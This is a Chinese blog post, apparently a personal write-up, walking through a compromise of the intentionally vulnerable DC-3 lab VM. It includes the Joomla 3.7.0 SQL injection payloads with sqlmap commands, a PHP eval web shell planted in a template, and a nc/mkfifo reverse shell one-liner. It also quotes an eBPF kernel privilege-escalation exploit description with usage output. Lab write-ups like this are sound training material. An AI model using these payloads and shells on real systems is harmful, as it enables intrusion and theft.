<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DC-3靶机笔记 | 浔阳江头夜送客</title><meta name="keywords" content="web安全,DC"><meta name="author" content="XUPT_w"><meta name="copyright" content="XUPT_w"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="DC-3DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in m">
<meta property="og:type" content="article">
<meta property="og:title" content="DC-3靶机笔记">
<meta property="og:url" content="https://xunyang1.github.io/2021/08/16/dc3/index.html">
<meta property="og:site_name" content="浔阳江头夜送客">
<meta property="og:description" content="DC-3DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in m">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://c-ssl.duitang.com/uploads/item/201801/24/20180124181910_neveu.jpg">
<meta property="article:published_time" content="2021-08-16T03:58:28.584Z">
<meta property="article:modified_time" content="2021-08-16T12:26:11.231Z">
<meta property="article:author" content="XUPT_w">
<meta property="article:tag" content="web安全">
<meta property="article:tag" content="DC">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://c-ssl.duitang.com/uploads/item/201801/24/20180124181910_neveu.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xunyang1.github.io/2021/08/16/dc3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'DC-3靶机笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-08-16 20:26:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/shubiao2.css"><link rel="stylesheet" href="/gitcalendar/css/gitcalendar.css"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><link rel="stylesheet" href="/css/gungongtiao.css"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="浔阳江头夜送客" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://c-ssl.duitang.com/uploads/item/201801/24/20180124181910_neveu.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">浔阳江头夜送客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-3靶机笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-16T03:58:28.584Z" title="发表于 2021-08-16 11:58:28">2021-08-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-16T12:26:11.231Z" title="更新于 2021-08-16 20:26:11">2021-08-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC-3靶机笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p>
<p>For those with experience doing CTF and Boot2Root challenges, this probably won’t take you long at all (in fact, it could take you less than 20 minutes easily).</p>
<p>If that’s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><ul>
<li><p>扫描网段发现主机ip 192.168.253.132</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201502.png"></p>
</li>
<li><p>对其全端口扫描，发现之开启了web服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201507.png"></p>
</li>
</ul>
<p>查看页面</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201540.png"></p>
<p>目录爆破，发现后台登录点</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201547.png"></p>
<p>发现后台管理页面</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201554.png"></p>
<p>cms为joomla，用joomscan扫一下试试</p>
<p>没发现其他什么信息，就可以看到joomla的版本时3.7.0</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201619.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201638.png"></p>
<blockquote>
<p>对爆破出来的目录都看了看，没啥有用信息</p>
<p>用户登录页也没啥可以注入的</p>
</blockquote>
<p>那就searchsploit joomla 3.7.0    </p>
<p>发现存在sql注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201645.png"></p>
<h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>看一下怎么操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201653.png"></p>
<p><strong>由下面可以看出joomla网站的index.php的list[fullordering]参数存在注入点，sqlmap的payload人家也写好了只需要将localhost变为靶机地址，其中list[fullordering]可以布尔盲注，报错注入，延时注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="line"># Date: 05-19-2017</span><br><span class="line"># Exploit Author: Mateus Lino</span><br><span class="line"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span><br><span class="line"># Vendor Homepage: https://www.joomla.org/</span><br><span class="line"># Version: = 3.7.0</span><br><span class="line"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="line"># CVE : - CVE-2017-8917</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)</span><br></pre></td></tr></table></figure>

<p>使用sqlmap</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201659.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201704.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201709.png"></p>
<p>跑出来了joomladb</p>
<p>接下来素质三连</p>
<ol>
<li>–tables -D “db_name” 【获取指定数据库中的表名 -D后接指定的数据库名称</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201714.png"></p>
<p>看到了users表</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201718.png"></p>
<ol start="2">
<li> –columns -T “table_name” -D “db_name” 【获取数据库表中的字段</li>
</ol>
<p>   <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201727.png"></p>
<p>   正在暴力破解</p>
<p>   <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201730.png"></p>
<p>   拿到字段名</p>
<p>   <img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201735.png"></p>
<ol start="3">
<li><p>–dump -C “columns_name” -T “table_name” -D “db_name” 【获取字段的数据内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201743.png"></p>
<p>拿到加密后的管理员密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201752.png"></p>
</li>
</ol>
<p>用john破解</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201757.png"></p>
<p>可以看到需要一个密码文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201803.png"></p>
<p>保存pass.txt,开始爆破，拿到密码snoopy</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201807.png"></p>
<h2 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h2><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201812.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201817.png"></p>
<p>有文件上传点，尝试了图片木马但是无法绕过检测</p>
<p>有模板模块，里面存放了模板文件，修改模板文件添加我们的一句话木马来getshell</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201822.png"></p>
<p>点进去</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201827.png"></p>
<p>可以看到该模板的文件有很多，</p>
<p>修改随便一个php文件，这里给component.php写入一句话木马，注意要先清空该文件再写入</p>
<p><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201830.png"></p>
<p>我们要用蚁剑连接，就要获取该文件的位置</p>
<p>方法两个：</p>
<ul>
<li>百度搜索joomla模板存储位置</li>
<li>用刚才的目录爆破结果获得路径</li>
</ul>
<p><strong>这里用方法2拿到绝对路径</strong></p>
<p>由下图可以看到存放模板的路径</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201837.png"></p>
<p>所以猜测URI为/templates/beez3/component.php，正常反应说明有这个文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201841.png"></p>
<p>找到shell的路径后用蚁剑连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201846.png"></p>
<p>连接成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201850.png"></p>
<p>打开shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201855.png"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ul>
<li>nc反弹，发现禁用了-e参数，所以不行</li>
<li>bash反弹也报错</li>
<li>php反弹也报错</li>
<li>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.253.131 8888 &gt;/tmp/f 成功</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201859.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201903.png"></p>
<p>获取反弹shell成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201907.png"></p>
<p>升级为交互式shell</p>
<p>两种都可以</p>
<ul>
<li>python -c ‘import pty;pty.spawn(“/bin/bash”)’</li>
<li>SHELL=/bin/bash script -q /dev/null</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201911.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>suid以及sudo-l均不行</p>
<p>查找系统漏洞</p>
<p>先看系统版本，linux 4.4.0  ubuntu 16.04</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201914.png"></p>
<p>searchspliot ubuntu 16.04  </p>
<p>试了半天也就这个能用</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201919.png"></p>
<p>看一下咋用</p>
<p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210816201924.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808</span><br><span class="line"></span><br><span class="line">In Linux &gt;=4.4, when the CONFIG_BPF_SYSCALL config option is set and the</span><br><span class="line">kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,</span><br><span class="line">unprivileged code can use the bpf() syscall to load eBPF socket filter programs.</span><br><span class="line">These conditions are fulfilled in Ubuntu 16.04.</span><br><span class="line"></span><br><span class="line">When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first</span><br><span class="line">function that touches the supplied eBPF instructions is</span><br><span class="line">replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF</span><br><span class="line">map file descriptors and looks up pointers for the corresponding map files.</span><br><span class="line">This is done as follows:</span><br><span class="line"></span><br><span class="line">	/* look for pseudo eBPF instructions that access map FDs and</span><br><span class="line">	 * replace them with actual map pointers</span><br><span class="line">	 */</span><br><span class="line">	static int replace_map_fd_with_map_ptr(struct verifier_env *env)</span><br><span class="line">	&#123;</span><br><span class="line">		struct bpf_insn *insn = env-&gt;prog-&gt;insnsi;</span><br><span class="line">		int insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">		int i, j;</span><br><span class="line"></span><br><span class="line">		for (i = 0; i &lt; insn_cnt; i++, insn++) &#123;</span><br><span class="line">			[checks for bad instructions]</span><br><span class="line"></span><br><span class="line">			if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) &#123;</span><br><span class="line">				struct bpf_map *map;</span><br><span class="line">				struct fd f;</span><br><span class="line"></span><br><span class="line">				[checks for bad instructions]</span><br><span class="line"></span><br><span class="line">				f = fdget(insn-&gt;imm);</span><br><span class="line">				map = __bpf_map_get(f);</span><br><span class="line">				if (IS_ERR(map)) &#123;</span><br><span class="line">					verbose(&quot;fd %d is not pointing to valid bpf_map\n&quot;,</span><br><span class="line">						insn-&gt;imm);</span><br><span class="line">					fdput(f);</span><br><span class="line">					return PTR_ERR(map);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				[...]</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		[...]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__bpf_map_get contains the following code:</span><br><span class="line"></span><br><span class="line">/* if error is returned, fd is released.</span><br><span class="line"> * On success caller should complete fd access with matching fdput()</span><br><span class="line"> */</span><br><span class="line">struct bpf_map *__bpf_map_get(struct fd f)</span><br><span class="line">&#123;</span><br><span class="line">	if (!f.file)</span><br><span class="line">		return ERR_PTR(-EBADF);</span><br><span class="line">	if (f.file-&gt;f_op != &amp;bpf_map_fops) &#123;</span><br><span class="line">		fdput(f);</span><br><span class="line">		return ERR_PTR(-EINVAL);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return f.file-&gt;private_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">The problem is that when the caller supplies a file descriptor number referring</span><br><span class="line">to a struct file that is not an eBPF map, both __bpf_map_get() and</span><br><span class="line">replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If</span><br><span class="line">__fget_light() detected that the file descriptor table is shared with another</span><br><span class="line">task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause</span><br><span class="line">the reference count of the struct file to be over-decremented, allowing an</span><br><span class="line">attacker to create a use-after-free situation where a struct file is freed</span><br><span class="line">although there are still references to it.</span><br><span class="line"></span><br><span class="line">A simple proof of concept that causes oopses/crashes on a kernel compiled with</span><br><span class="line">memory debugging options is attached as crasher.tar.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">One way to exploit this issue is to create a writable file descriptor, start a</span><br><span class="line">write operation on it, wait for the kernel to verify the file&#x27;s writability,</span><br><span class="line">then free the writable file and open a readonly file that is allocated in the</span><br><span class="line">same place before the kernel writes into the freed file, allowing an attacker</span><br><span class="line">to write data to a readonly file. By e.g. writing to /etc/crontab, root</span><br><span class="line">privileges can then be obtained.</span><br><span class="line"></span><br><span class="line">There are two problems with this approach:</span><br><span class="line"></span><br><span class="line">The attacker should ideally be able to determine whether a newly allocated</span><br><span class="line">struct file is located at the same address as the previously freed one. Linux</span><br><span class="line">provides a syscall that performs exactly this comparison for the caller:</span><br><span class="line">kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).</span><br><span class="line"></span><br><span class="line">In order to make exploitation more reliable, the attacker should be able to</span><br><span class="line">pause code execution in the kernel between the writability check of the target</span><br><span class="line">file and the actual write operation. This can be done by abusing the writev()</span><br><span class="line">syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays</span><br><span class="line">read accesses, then mmap()s a file containing a struct iovec from that FUSE</span><br><span class="line">filesystem and passes the result of mmap() to writev(). (Another way to do this</span><br><span class="line">would be to use the userfaultfd() syscall.)</span><br><span class="line"></span><br><span class="line">writev() calls do_writev(), which looks up the struct file * corresponding to</span><br><span class="line">the file descriptor number and then calls vfs_writev(). vfs_writev() verifies</span><br><span class="line">that the target file is writable, then calls do_readv_writev(), which first</span><br><span class="line">copies the struct iovec from userspace using import_iovec(), then performs the</span><br><span class="line">rest of the write operation. Because import_iovec() performs a userspace memory</span><br><span class="line">access, it may have to wait for pages to be faulted in - and in this case, it</span><br><span class="line">has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,</span><br><span class="line">allowing the attacker to suspend code execution in the kernel at that point</span><br><span class="line">arbitrarily.</span><br><span class="line"></span><br><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~/ebpf_mapfd_doubleput# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: 